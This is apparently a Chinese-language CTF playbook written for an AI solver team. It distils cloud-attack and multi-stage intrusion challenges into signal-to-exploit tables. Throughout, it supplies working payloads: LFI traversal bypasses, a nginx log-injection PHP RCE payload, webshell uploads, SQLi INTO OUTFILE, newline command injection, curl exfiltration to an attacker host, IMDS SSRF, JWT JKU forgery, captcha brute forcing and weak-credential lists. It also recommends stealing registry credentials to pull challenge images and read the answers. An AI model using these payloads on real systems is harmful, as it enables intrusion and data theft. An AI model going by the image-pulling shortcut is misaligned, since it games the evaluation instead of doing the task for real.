# 云攻击与多阶段渗透决策树

> 适用：云原生环境、内网横向移动、多阶段渗透链。包括 D 系列（云攻击）和 B 系列（多阶段）实战蒸馏。

### Cloud / Internal Network

After getting initial access (webshell, RCE):

```bash
# Enumerate the internal network from the compromised host
ip a; cat /etc/hosts; arp -a
# Scan for internal services
for p in 22 80 443 3306 6379 8080; do
  timeout 2 bash -c "echo >/dev/tcp/<internal_ip>/$p" 2>/dev/null && echo "OPEN $p"
done
```

- **Redis**: try no-auth or weak passwords (`123456`, `12345678`), then `GET *`, `INFO`, `CONFIG GET dir`
- **MySQL/MariaDB**: use extracted credentials, `LOAD_FILE()` to read flags
- **SSRF chains**: proxy.php/tunnel.php as SSRF pivot to internal services
- **Command injection in admin panels**: ping/health-check features often have injection points
- **Pivoting**: PHP `fsockopen` tunnel on webshell, or `chisel` + `proxychains`

### 云攻击决策树 — 信号 → 打法（D系列实战蒸馏）

D 系列是"云攻击"题——目标跑在模拟云环境里（S3 对象存储、Lambda 云函数、EC2+IMDS、Azure Blob/AAD、MinIO 存储网关），你要利用**云原生服务的错误配置和元数据泄露**拿 flag。本环境 6 题中 **5 题解出**，全部 bootstrap 一击命中（<1min）。

D 系列的核心特征：**flag 不在传统漏洞里，而在云服务的配置泄露、元数据端点、凭据链传递中**。题面通常明说云服务类型（"对象存储"、"无服务器"、"云主机"、"云身份平台"）。

#### 信号 → 打法（逐条命中案例）

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| **S3 兼容对象存储，path-style 匿名访问** | 先列已知 bucket，然后读公开文件找**其他 bucket 名**（README、config 常泄露）。拿到新 bucket 名后匿名列举 `GET /<bucket>/` 看对象列表 | d-01：公开 bucket `/company-assets/README.txt` 泄露了 `secret-data` bucket → 匿名列 `/secret-data/` 看到 flag.txt |
| **Lambda/云函数管理门户** | 找**未鉴权的配置查询端点**：`GET /api/functions/<name>/config`、`GET /api/functions`（列表）。函数的**环境变量**里常存 DB 密码/API key/flag | d-02：`GET /api/functions/order-service/config` → 环境变量 `DATABASE_PASSWORD` = flag |
| **云主机 Web 应用有 URL 获取/代理功能** | **SSRF → IMDS（实例元数据服务）**。先看 `/api/status` 等端点是否泄露内部元数据地址（常是 `http://imds:8080` 或 `http://169.254.169.254`），再用 SSRF 端点请求 `http://imds:8080/latest/meta-data/iam/security-credentials/<role>` 拿 IAM 凭据 | d-03：`/api/fetch` SSRF → `http://imds:8080/latest/meta-data/iam/security-credentials/s3-access-role` → SecretAccessKey = flag |
| **Azure AD / 设备码认证流** | 找泄露 `client_id` 和 `tenant_id` 的端点，然后走 **device code flow**：`POST /<tenant>/oauth2/v2.0/devicecode` 获取 device_code → `POST /<tenant>/oauth2/v2.0/token` (grant_type=device_code) → JWT 的 claim 里可能有 flag。**不需要实际用户登录**——有些实现 token 端点直接返回 | d-05：`/api/blob-leak` 泄露 client_id/tenant → devicecode → token JWT 的 `sensitive_data` claim = flag |
| **云存储网关 + JWT 认证 + STS（安全令牌服务）** | **完整凭据链攻击**：(1) 注册账号 (2) `/api/config` 泄露 bucket 名 (3) **JWT JKU 伪造**——上传自制 JWKS（`kty=oct` 对称密钥）到可写 bucket，forge HS256 JWT 的 `jku` header 指向它 (4) 用伪造 JWT 调 STS 换临时凭据 (5) 读 `terraform.tfstate`/`.git` 找更高权限凭据 (6) root 凭据访问 secret bucket | d-06：注册→config泄露→JKU伪造JWT→STS换MinIO凭据→读terraform/prod.tfstate→root凭据→secrets-vault/final/flag.txt |
| **Azure Blob Storage + SAS token 门户** | 先试门户生成的 SAS token 读 blob。如果 403，试 **Azurite 默认 dev key**（`Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/K1SZFPTOtr/KBHBeksoGMGw==`）。如果默认 key 也 403，说明用了**自定义 key**——此时换方向：检查 container name / blob name 是否**不验证**（注入 `restype=container&comp=list` 参数列举 blob），或找其他泄露 key 的端点 | d-04（未解出）：默认 key 403，container name 不验证（SSTI 探测到了 Azurite），但未走通列举/绕过路径 |
| **任何云题，先探 `/api/status`、`/api/config`、`/api/containers`、`/.env`** | 这些端点常**无鉴权**，直接泄露内部架构（bucket 名、内部服务地址、IMDS endpoint、Azurite 地址） | d-01（README 泄露 bucket）、d-03（status 泄露 imds 地址）、d-06（config 泄露 bucket 名） |

#### 云元数据/凭据端点速查

```
AWS EC2 IMDS:     http://169.254.169.254/latest/meta-data/
                  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
AWS Lambda env:   函数配置的环境变量（通过管理 API 或 /proc/self/environ）
Azure IMDS:       http://169.254.169.254/metadata/instance?api-version=2021-02-01 (需要 Metadata: true header)
GCP IMDS:         http://metadata.google.internal/computeMetadata/v1/ (需要 Metadata-Flavor: Google header)
Azurite dev key:  Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/K1SZFPTOtr/KBHBeksoGMGw==
Azurite account:  devstoreaccount1
S3 path-style:    http://<host>/<bucket>/<key>  或  http://<host>/<bucket>/?list-type=2
```

#### d-04 失败教训（Azure Blob SAS）→ ATX 正确解法

d-04 是虫洞唯一未解出的 D 题。ATX 解出了，差距在两个关键点：

**虫洞卡点**：Azurite 用了"自定义 key"（非默认 dev key），所有 SAS token 都返回 403。虫洞以为是密钥/签名算法问题，反复换 key/算法。

**ATX 的正确解法**：
1. **真正的 bug 是 URL 参数截断**——SAS token 里的 `&` 被 URL query 解析当成分隔符，门户收到的 `sas` 只有第一段（`se=...`），sig 丢了 → 全 403
2. **解法**：把整个 SAS token URL 编码成单个值：`urllib.parse.quote(sas_token, safe='')`，403 就消失了
3. **flag 不在 flag.txt**——用账户级 SAS 的 list 权限枚举容器，发现真名是 `secret-vault/admin-credentials.txt`

```bash
SAS=$(curl -s http://<target>:8000/api/sas/generate | jq -r .sas_token)
ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$SAS")
curl "http://<target>:8000/api/sas/secret-vault/admin-credentials.txt?sas=$ENC"
```

**教训**：
- **403 归因要先排除"参数传递被截断"**——先用垃圾值 `sas=abc` 探测门户是否真透传 sas，再怀疑密钥。虫洞在错误归因（"自定义 key"）上耗了整个时间。
- **flag 名不要假设**——有 list 权限就先枚举容器内全部 blob，flag 常藏在 `admin-credentials.txt` 这类非显然名字里。

#### 关键心态

- **D 系列题第一步永远是探 `/api/status`、`/api/config` 等信息泄露端点**——它们直接告诉你内部架构（bucket 名、IMDS 地址、Azurite 地址、STS 端点）。
- **flag 常在凭据链的终点**，不在第一个漏洞里。d-06 的完整链是 6 步（注册→config→JKU→STS→terraform→root），每步拿到的凭据解锁下一步。
- **IMDS 是云题的万能钥匙**——一旦有 SSRF 能访问 `169.254.169.254` 或 `imds:8080`，IAM 凭据基本就到手了。
- **Azurite/S3 模拟器的默认 key 是公开的**——先试默认 key（上面速查表里的），不行再想别的办法。
- **JWT JKU/JWKS 伪造在云题里高频出现**——能上传文件到可访问路径 + 服务端信任 JKU header = 可伪造任意身份。

### 多阶段渗透决策树 — 信号 → 打法（B系列实战蒸馏）

B 系列是"多阶段渗透"题——从外网门户入手，逐步突破多层防线（Web → 内网 → OA → 数据库），最终拿到多个 flag。**核心特征：flag 不在第一个入口，而在内网深处**。本节由虫洞实战蒸馏（b-01 4/4、b-02 从 0 到 ≥4、b-03 4/4，总分 60/74），并融合 ATX 战队的互补路线。

B 系列的标准链路是 **5 个阶段**，每阶段拿一个 flag 或一个跳板：

```
外网门户 → LFI/SSRF/RCE foothold → 内网探测 → 内部服务利用 → OA/数据库拿 flag
```

> ⚠️ **先读 §0 环境轮换**——它是 B 系列最大的隐藏 boss，不掌握它前面所有努力都会白费。

#### §0 环境轮换（env rotation）—— 头号隐藏 boss【虫洞实战】

B 系列靶机**会定期重新实例化**，导致你前面积累的一切"事实"突然失效。b-01/b-02/b-03 三题虫洞都反复踩坑：

| 失效现象 | 实战表现 |
|----------|----------|
| **IP/hostname 互换** | b-01：天盾站点从 .177 跑到 .178，.177 变成另一个应用；b-02：锐安科技从 .176 跑到 .164.147 |
| **Docker 网段漂移** | 内网从 172.18.0.x → 172.19.0.x → 172.20.0.x → 172.21.0.x，每次实例化可能换段 |
| **flag 值变 UUID** | 同一台 `/challenge/flag1.txt`，两次实例化 flag 完全不同（b-03：b68cd011→e1b90d27→d7bc058f） |
| **webshell 被清空** | 上传的 `/uploads/shell.php` 下次进来 404（容器重建，文件没了） |
| **凭据轮换失效** | b-03：MySQL `root:root` 在一个实例可用，重实例化后变 AUTH_FAIL |

**对抗策略（按重要性）**：
1. **绝不硬编码 IP/flag/凭据**——每次会话开始重新探测（`/etc/hosts`、`ip a`、ARP）。图谱里记的旧 IP 要当"线索"不当"事实"。
2. **拿到 webshell 立刻出成果**——它可能随时消失。优先读 `/challenge/flag*.txt`、dump 凭据到 `team/findings/`，别先去铺基础设施。
3. **ARP 表判活 > 端口扫描**——见阶段2。
4. **终极手段：Docker image layer 提取**（§1）——环境怎么轮换，镜像 layer 里的 flag 植入逻辑和默认凭据不变，这是"开卷考试"。
5. **flag 值随轮换失效——读到就立刻提交，过期值作废**——平台只认**当前实例**的 flag 值。一旦某 flag 被 rejected，说明环境已轮换、该值过期，必须从当前实例**重新读取新值**，绝不能拿图谱/历史里的旧 flag 反复提交。**血的教训（b-01/b-02 实战）**：retry 继承的旧图谱里塞满了上一个实例的 flag，solver 误判"已找到 N 个 flag → 完成"，rounds=0 不再探测，直接提交一批过期 flag 全被拒 → 看着像"拿到 flag 没得分"。工程层已修（rejected flag 持久化标记 + 完成判定排除失效 flag），但解题时要主动意识到：**retry 时图谱里的 flag 大概率已过期，必须重新从当前实例拿新值再提交**。

#### §1 Docker image layer 提取 —— 对抗轮换的杀手锏【b-03 决胜】

当靶机跑在云上（腾讯云/阿里云/AWS），且你已有任意 RCE，可以**直接把靶机镜像拉下来拆开**，一次性看到所有 flag 植入路径、硬编码凭据、WAF 规则。b-03 靠这一招从 2/4 直接到 4/4。

**完整链路**：
1. **云 metadata 拿 registry 凭据**——从 RCE 容器访问云 metadata（腾讯云 `169.254.0.23`，AWS `169.254.169.254`），读 user-data：
   ```bash
   # 在 RCE 容器内
   curl -s http://169.254.0.23/latest/user-data
   # b-03 实测：含 docker login <registry> -u <id> -p <JWT>，JWT 有效期到 2099 年
   ```
2. **pull 靶机镜像**——registry 常是 `xxx.tencentcloudcr.com` / `xxx.aliyuncs.com`，`/v2/_catalog` 列出所有镜像（如 `tsecbench/b-03-web`、`b-03-oa`、`b-03-db`）。
3. **解 layer 读源码**——manifest → 各层 blob（302 到 COS/OSS）→ 下载解压到 `/tmp/layers/`，关键文件优先读：
   ```
   /init_redis.sh                            # flag 植入 Redis 的逻辑 + AUTH 密码
   /docker-entrypoint-initdb.d/init.sql      # DB 种子 + 默认账号密码
   /app/src/app.py                           # 应用源码：路由、WAF 规则、硬编码凭据、flag 渲染逻辑
   /init_db.py                               # 用户表 + 密码 hash
   ```
4. **b-03 实战产出**：从 layer 直接读到——flag2 在 OA `/admin` 页渲染、flag3 在 OA `/challenge/flag3.txt`（命令注入读）、flag4 是 Redis `corporate_secret`（AUTH 12345678）、OA 凭据 `admin/1qaz@WSX`、WAF 拦 `;|&` 但不拦 `%0a`。**所有剩余 flag 的位置和拿法一目了然**。

> 这一招的本质：**靶机的 flag 植入逻辑写在镜像构建脚本里，而镜像是静态的**。环境实例化只换运行时状态（IP/flag值/容器），换不掉镜像内容。所以拉镜像 = 看答案。

#### 阶段 1：外网 foothold

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| PHP 站点 `services.php?lang=en` 语言切换参数 | **LFI 测试**，用 `....//` 四点斜杠绕过单次 `str_replace`：`?lang=....//....//....//....//etc/hosts` | b-01：`....//` 绕过 WAF 读 /etc/hosts 发现内网拓扑 |
| LFI 能读文件但 `php://filter` 被拦（"非法协议"） | **转日志注入拿 RCE**。PHP 站点的 LFI + nginx 日志 = RCE 通道（见下"error-log 注入"） | b-01：php://filter 被拦 → 走日志注入 |
| PHP 站点有 `/proxy.php` 代理端点 | **先测 `file://`**（`?url=file:///etc/passwd`）。proxy.php 常是**未鉴权**的 curl 转发（auth 检查是空 if 块），file://+http:// 都支持 | b-02：proxy.php 未授权 SSRF，file:// 读源码 + http:// 转发内网 |
| 登录页，题面/注释给测试账号或弱口令提示 | **先猜弱密码**：`admin/Admin@123`、`admin/1qaz@WSX`、`editor/a1111111` | b-01/b-03：`admin/Admin@123` 直接进；b-02：`admin/1qaz@WSX` 进 OA |
| 上传接口只验证 Content-Type / 黑名单漏 `.php` | **直接传 `.php` webshell**：`curl -F "file=@shell.php;type=image/gif"`。b-03 的 upload.php 黑名单只有 exe/bat/cmd/sh，漏了 php | b-03：`Content-Type: image/gif` 传 cmd.php → RCE |

**【新】nginx error-log 注入 RCE（b-01 实战）**——当 LFI 可读日志但 access.log 投毒失效时：

access.log 会被 **opcache 缓存**，LFI 包含它时冻结在某一行（b-01 冻结在第34行），后续注入的 payload 永不执行。**error.log 不被缓存，是可靠通道**：

1. 构造一个**会 LFI 包含 access.log 并触发 PHP Fatal error** 的请求——payload 放在 **User-Agent header**（不能放 URL query，会被 percent-encode 成 `%3C?php` 不执行）：
   ```
   GET /services.php?lang=....//....//....//....//var/log/nginx/access.log&c=id HTTP/1.1
   User-Agent: <?php/*x*/system($_GET['c']);/*y*/?>
   ```
2. 这个请求包含 access.log 时在第34行 Fatal error，nginx 把**整条请求行（含 UA 里的 payload）写入 error.log 的 `request:` 字段**。
3. 再 LFI 包含 error.log 执行 payload：`?lang=....//....//....//....//var/log/nginx/error.log&c=id`

**关键坑**：
- payload **不能含空格**——nginx request-line 按空格截断，空格后的内容进不了日志。用 `/*注释*/` 填充：`<?php/*x*/system($_GET['c']);/*y*/?>`。
- **UA 注入 vs URL 注入**：URL 里的 `<?php` 会变 `%3C?php` 不执行，必须走 UA header。
- 容器重实例化后日志清空，需重新注入（环境轮换，见 §0）。

#### 阶段 2：从 foothold 到内网探测

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| 有 RCE/LFI 但不知内网结构 | **读 `/etc/hosts` + `/proc/net/{arp,tcp,route}`** 拿 Docker 网段（通常 172.18-172.21.0.x bridge） | b-01：LFI 读 /etc/hosts 发现 172.20.0.x 内网 |
| **容器内 ping/nmap 不可用（EPERM）** | **读 `/proc/net/arp` 判活**——complete MAC（如 `be:13:02:e3:c4:55`）= 真实存活，`00:00:00:00:00:00` INCOMPLETE = 死的。比端口扫描可靠（stale 扫描结果会误导） | b-03：ARP 表确认只有 .1/.2/.3 三台存活，排除了扫描里的 28 个 stale 假阳性 |
| 找到 `tunnel.php`/`check_port.php` 类端点 | **当 SSRF 拐杖**：`?action=scan&host=<ip>&ports=22,80,3306,6379,8080` 扫内网，`?action=http&url=http://<internal>:port/` 转发 HTTP | b-01：tunnel.php 扫到内网 Flask 面板 + Redis |
| 内网有运维/API 面板（gunicorn/Flask，`172.x.x.x:8080`） | **直接 GET `/api/config`、`/api/status`**——常无鉴权，直接吐 `corporate_secret`（**直接是 flag！**）+ api_keys + DB/Redis 连接信息 | b-01/b-02/b-03：`/api/config` 的 `corporate_secret` 字段就是 flag，三题通用拿分点 |
| 内网有 Redis | **弱密码**（`12345678`、`123456`）→ `KEYS *` → flag 常在 `corporate_secret` key | b-01/b-03：Redis AUTH `12345678`，`GET corporate_secret` = flag |
| 内网有 MySQL/MariaDB | **`root:root` 先试**（很多实例默认开），`SELECT * FROM corporate.secrets` | b-02/b-03：MariaDB `root:root`，corporate.secrets 表 corporate_secret = flag |

#### 阶段 3：OA / 内部系统命令注入

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| OA 面板有"网络诊断"/"ping 测试"功能 | **命令注入**。但这些功能常禁 raw socket（ping 本身 EPERM），需绕法（见下） | b-03：OA ping 功能命令注入 |
| ↳ WAF 拦 `;|&` 但 ping 在容器内 EPERM | **newline(`%0a`)链式注入**——`$(...)` 替换依赖 ping 执行回显，但容器内 ping 是 EPERM（无 CAP_NET_RAW），`$()` 输出不可见。改用换行：`target=1.1.1.1%0acat /challenge/flag3.txt%0a` | b-03：`%0a` 没被 WAF 拦，flag3 到手 |
| ↳ WAF 只拦全大写 SQL 关键字 | **大小写混合绕过**：`UnIoN sElEcT` | b-03：OA `/api/employees?name=` SQLi，混合大小写绕过 |
| 命令注入成功但无回显 | **OOB 外带**：攻击机起 PHP `cap.php` 记录 POST body，注入里 `curl -s -X POST --data-binary @/<file> http://<attacker>/cap.php` | b-01（ATX）：OA 命令注入无回显 → curl 外带 |

#### 阶段 4：webshell 部署与横向

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| 有 webshell 但 worker 容器无法直连内网 | **把 webshell 当跳板**——在 webshell 上执行 curl/wget 访问内网。worker 容器有网络隔离，但 web 容器（webshell 所在）能访问内网 | b-02（ATX）：worker→OA 超时，web 容器内 curl 内网可达 |
| **容器无 mysql/redis-cli/python3（只有 PHP）** | **纯 PHP socket 手写协议客户端**——这是"极简容器"的通用解法（见下） | b-03：web 容器只有 PHP，全靠手写客户端打 MariaDB + Redis |
| 后台登录被验证码阻断 | 见下方**验证码绕过三连** | b-02/b-03 |
| articles.php 类页面有 SQLi | `SELECT...INTO OUTFILE` 写 webshell：`?id=1' UNION SELECT 1,'<?php echo shell_exec($_GET["c"]);?>',3 INTO OUTFILE '/var/www/html/w.php'-- -` | b-02（ATX）：articles.php SQLi → INTO OUTFILE 写 w.php |

**纯 PHP 手写协议客户端（b-03 实战）**——容器只有 PHP、无任何 DB 客户端时：

- **MySQL（mysql_native_password 握手）**：用 `stream_socket` 发原生字节。客户端 capability flags 用 `LONG_PASSWORD|PROTOCOL_41|SECURE_CONNECTION|PLUGIN_AUTH`（**不含 CONNECT_WITH_DB**）；**每个命令阶段 packet sequence number 归零**；按协议解析握手包→ scramble → 发认证包。b-03 用 `/tmp/mysql_raw.php` 以 `root:root` 连 MariaDB dump 出 corporate.secrets。
- **Redis（RESP 协议）**：`stream_socket` 发 `*2\r\n$4\r\nAUTH\r\n$8\r\n12345678\r\n*3\r\n$3\r\nGET\r\n$16\r\ncorporate_secret\r\n`，写个 bulk-string 解析器读响应。b-03 用 `/tmp/redis_client.php` 拿到 flag4。

> 这两个客户端模板值得复用——多阶段题的 web 容器经常是"只有 PHP"的精简镜像，官方客户端一律没有。

#### 验证码绕过三连【b-02/b-03 实战】

后台登录常带验证码，按"成本从低到高"试：

| 方法 | 适用场景 | 命中案例 |
|------|----------|----------|
| **省略 captcha 字段** | 表单校验逻辑写歪——不传 captcha 字段直接跳过验证 | b-03：OA 登录 omit captcha 字段 → 直接进凭据校验 |
| **读 Flask session cookie 明文** | Flask 应用，验证码存 signed session | b-02/b-03：session cookie base64 解码出 `{"captcha":"4001"}`，直接读真实值 |
| **读 PHP session 文件** | PHP 应用，SSRF/LFI 能读 `/tmp/sess_<PHPSESSID>` | b-02（ATX）：SSRF file:// 读 session 文件拿验证码明文 |
| **彩色验证码颜色分割 OCR** | 验证码每个字符用不同纯色绘制（无 OCR 库时） | b-02：4位数字每个不同纯色，PIL 按颜色聚类 + 模板匹配，100% 准确 |
| **登录 oracle 暴力解** | 验证码值在 session 内跨 POST 持久、可重放 | b-02：验证码持久 → 10000 组合并行爆破（~1.5s），用"验证码错误 vs 用户名密码错误"响应差当 oracle |

> 彩色验证码 OCR 细节（b-02）：背景 (240,240,240)，4 个数字分别是灰/蓝/红/绿纯色，x 范围不重叠 → PIL 按颜色阈值分割每个数字 → 和 10 个标准字形模板匹配。**只要验证码是"每字符单色"，这个方法 100% 可靠**，无需 tesseract/ddddocr。

#### 内网 Java 服务攻击面【b-01 实战】

内网常跑 Java 服务（HugeGraph、GeoServer、自定义 Spring）。当 Web 层漏洞被沙箱堵住时，看 **JDWP debug port**：

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| Java 服务 `JAVA_OPTS`/`System.getenv()` 暴露 `-agentlib:jdwp...address=*:5005` | **JDWP RCE**——Gremlin/SpEL 沙箱禁了 Runtime.exec 时，debug port 是后门。BREAKPOINT on 关键方法（如 `GremlinAPI.post`）+ 触发一个请求 → 在 suspended thread 上 `ClassType.InvokeMethod` | b-01：HugeGraph Gremlin 沙箱禁 Runtime → 走 JDWP 5005 建立 invoke 原语（详见 [`cve-products.md`](cve-products.md) → JDWP） |
| 内网有 GeoServer（`/geoserver` context） | **CVE-2024-36401 RCE + REST API 写脚本读回**——`Runtime.exec` 按空格分词无引号，用 REST Resource API PUT shell 脚本到 `data_dir/www/`，再 exec('sh ...sh')，从 `/geoserver/www/out.txt` 读结果 | b-01 flag3：GeoServer CVE-2024-36401 读 /challenge/flag.txt（详见 [`cve-products.md`](cve-products.md) → GeoServer） |

#### 多 flag 的分布规律（B 系列每题 4~6 flag）

| Flag 位置 | 获取方式 | 案例 |
|-----------|----------|------|
| 外网 Web 容器 | RCE/LFI 读 `/challenge/flag1.txt` | b-01 flag1：error-log RCE；b-03 flag1：upload webshell |
| 内网运维面板 `/api/config` | 未授权 GET，`corporate_secret` 字段 | b-01/b-02：ops panel /api/config |
| 内网 Redis/MySQL | 弱密码/`root:root`，`corporate_secret` | b-03 flag4：Redis AUTH 12345678 |
| 独立靶机（GeoServer/合同系统） | 各自的 CVE/LFI | b-01 flag3：GeoServer CVE-2024-36401；flag4：download.php LFI（`id=../../../../challenge/flag.txt`，admin/admin123） |
| OA 系统深层 | 命令注入 + 文件翻找 | b-03 flag2：OA /admin 渲染；flag3：OA %0a 注入读 flag3.txt |

#### b-02 两条路线（虫洞路线 + ATX 互补路线）

b-02 是"APT 全链路"题（泛微 OA + SSH + 核心业务系统，6 flag）。**两条路线都能拿分**：

**路线 A（虫洞这次走通，≥4 flag）**：
```
外网门户 → proxy.php 未授权 SSRF(file://读源码) / upload.php 上传 webshell
  → [flag1] DeepTech admin 面板"系统密钥"(editor/Admin123 暴力破解 + 彩色验证码 OCR)
  → 内网 Docker 探测 → MariaDB root:root
  → [flag2] corporate.secrets corporate_secret（同时 Redis corporate_secret）
  → OA 172.x.0.2:8080 admin/1qaz@WSX（Flask session cookie 绕验证码）
  → [flag] OA /admin 渲染
```

**路线 B（ATX 战队互补参考，泛微 SSH 凭据链）**——虫洞这次没走这条，但泛微 SSH 链有独立价值：
```
proxy.php SSRF → 读 /tmp/sess 绕验证码 → webshell → flag1/flag2(纯文件读)
SSH 凭据链：题面"产品名相关默认凭证" → 泛微=Weaver → admin/Weaver@2023
  → SSH 登录泛微管理员服务器 → flag5 → backup/credentials.zip(密码123456)
  → 核心业务系统凭据 sysadmin/Pr0d#Secure!2023 → dashboard flag6
```

> **b-02 教训（已更新）**：旧版 skill 写"虫洞0flag"，那是早期。这次虫洞走路线 A 拿了 ≥4 flag。路线 B 的泛微 SSH 凭据链（`Weaver@2023`、SSH→zip→核心系统）仍有参考价值——**凭据是链式传递的**：一个凭据解锁下一个。注意 b-02 内网里有的 OA 是"深科OA"（不是泛微，别打 Weaver 漏洞，全 404）。

#### 凭据速查（B 系列高频弱口令）

```
admin / Admin@123        # b-01/b-03 外网门户、合同系统 admin
admin / 1qaz@WSX         # b-02/b-03 OA 系统（键盘组合弱口令）
editor / Admin123        # b-02 DeepTech editor
editor / a1111111        # b-03（auth.php 硬编码）
root / root              # b-02/b-03 MariaDB（注意：会轮换失效，见 §0）
Redis AUTH: 12345678     # b-01/b-02/b-03 通用
admin / geoserver        # b-01 GeoServer 默认
admin / Weaver@2023      # b-02 泛微 OA（ATX 路线，产品名派生）
```

#### 关键心态

- **先读 §0 环境轮换**。它是 B 系列最大的坑——webshell 会消失、flag 会变、IP 会换。**不硬编码、快出成果、拉镜像看答案**。
- **flag 不在入口**。外网门户只是第一步，真正的 flag 在内网 2-3 跳之后。拿到 foothold 后**第一件事是探测内网**（ARP 判活 → `/api/config` → Redis/MySQL 弱密码），不是深挖入口漏洞。
- **`/api/config` 是内网提分点**。内网运维面板的 `/api/config`、`/api/status` 常无鉴权，`corporate_secret` 直接是 flag——b-01/b-02/b-03 三题都命中。
- **SSRF/tunnel/proxy.php 是核心拐杖**。一旦找到，当万能钥匙：扫内网、转发请求、读 session 绕验证码、读源码。
- **Docker image layer = 开卷答案**。有云 RCE 就拉镜像拆 layer，flag 植入逻辑和默认凭据都在里面，环境轮换也换不掉（§1）。
- **凭据链式传递**（b-02 核心教训）。SSH → zip(123456) → 核心系统密码。每次拿到新凭据，立刻想"它能在哪用？解锁什么？"
- **题目描述字面理解**。"产品名相关默认凭证" → 泛微=Weaver → `Weaver@2023`。别过度复杂化。
- **协调文件是生命线**。把每个确认发现（凭据/IP/死路）写入 `team/findings/`，peer 直接复用，避免重复劳动。
